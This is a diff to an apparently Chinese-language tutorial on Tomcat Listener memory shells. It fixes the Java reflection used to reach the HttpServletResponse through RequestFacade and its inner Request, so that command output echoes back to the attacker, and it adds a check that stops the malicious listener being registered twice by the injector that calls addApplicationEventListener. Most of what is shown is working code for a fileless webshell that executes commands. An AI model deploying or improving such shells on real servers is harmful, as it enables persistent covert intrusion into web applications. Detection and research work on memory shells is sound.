@@ -153,11 +153,18 @@ public class ListenerMemShell implements ServletRequestListener {
                 String result = scanner.hasNext() ? scanner.next() : "";
 
                 // 回显 —— 通过反射获取 Response 对象
-                Field responseField = servletRequest.getClass()
+                // 注意：servletRequest 实际类型是 RequestFacade
+                // 需先获取内部 Request，再从中取 response 字段
+                Field reqField = servletRequest.getClass()
+                    .getDeclaredField("request");
+                reqField.setAccessible(true);
+                Object innerRequest = reqField.get(servletRequest);
+                
+                Field responseField = innerRequest.getClass()
                     .getDeclaredField("response");
                 responseField.setAccessible(true);
-                HttpServletResponse response = (HttpServletResponse) 
-                    responseField.get(servletRequest);
+                HttpServletResponse response = (HttpServletResponse)
+                    responseField.get(innerRequest);
 
                 response.getWriter().write("<pre>" + result + "</pre>");
                 scanner.close();
@@ -239,11 +246,17 @@ public class MultiListenerMemShell
             String result = scanner.hasNext() ? scanner.next() : "";
 
             // 反射回显
-            Field responseField = request.getClass()
+            // 注意：request 实际类型是 RequestFacade，需先获取内部 Request
+            Field reqField = request.getClass()
+                .getDeclaredField("request");
+            reqField.setAccessible(true);
+            Object innerRequest = reqField.get(request);
+            
+            Field responseField = innerRequest.getClass()
                 .getDeclaredField("response");
             responseField.setAccessible(true);
             HttpServletResponse response = (HttpServletResponse)
-                responseField.get(request);
+                responseField.get(innerRequest);
             
             // 确保响应未提交
             if (!response.isCommitted()) {
@@ -284,10 +297,19 @@ public class ListenerMemShellInjector {
      * 核心：调用 StandardContext.addApplicationEventListener()
      */
     public static void inject(StandardContext context) {
-        // Step 1: 创建恶意 Listener 实例
+        // Step 1: 检查是否已注入（防重复）
+        for (Object listener : context.getApplicationEventListeners()) {
+            if (listener.getClass().getName()
+                    .equals("ListenerMemShell")) {
+                System.out.println("[!] Listener already injected.");
+                return;
+            }
+        }
+
+        // Step 2: 创建恶意 Listener 实例
         ListenerMemShell listener = new ListenerMemShell();
 
-        // Step 2: 直接调用 public 方法注册（无需反射！）
+        // Step 3: 直接调用 public 方法注册（无需反射！）
         context.addApplicationEventListener(listener);
 
         System.out.println("[+] Listener memory shell injected.");
@@ -358,21 +380,27 @@ context.addApplicationEventListener(maliciousListener);  // DONE ✓
 
 ### 4.2 回显的技术细节
 
-Listener 的 `requestInitialized` 方法只接收 `ServletRequestEvent` 参数，无法直接获取 `HttpServletResponse`。但 Tomcat 内部的 `Request` 对象持有对 `Response` 的引用：
+Listener 的 `requestInitialized` 方法只接收 `ServletRequestEvent` 参数，无法直接获取 `HttpServletResponse`。需要通过**两步反射**：
 
 ```java
-// Tomcat 内部实现
-public class Request implements HttpServletRequest {
-    protected Response response;  // ← 内部持有 Response 引用
-}
+// Tomcat 内部结构
+// ServletRequestEvent.getServletRequest() → RequestFacade
+//   └── request 字段 → org.apache.catalina.connector.Request
+//         └── response 字段 → org.apache.catalina.connector.Response
 ```
 
-因此通过反射获取即可：
+**关键点**：`RequestFacade` 只有 `request` 字段（指向内部 `Request`），**没有** `response` 字段。`getDeclaredField()` 只查找当前类声明的字段，不会向上搜索父类。因此必须：
 
 ```java
-Field responseField = servletRequest.getClass().getDeclaredField("response");
+// Step 1: 从 RequestFacade 中取出内部 Request
+Field reqField = servletRequest.getClass().getDeclaredField("request");
+reqField.setAccessible(true);
+Object innerRequest = reqField.get(servletRequest);
+
+// Step 2: 从内部 Request 中取出 Response
+Field responseField = innerRequest.getClass().getDeclaredField("response");
 responseField.setAccessible(true);
-HttpServletResponse response = (HttpServletResponse) responseField.get(servletRequest);
+HttpServletResponse response = (HttpServletResponse) responseField.get(innerRequest);
 ```
 
 ### 4.3 防重复注入
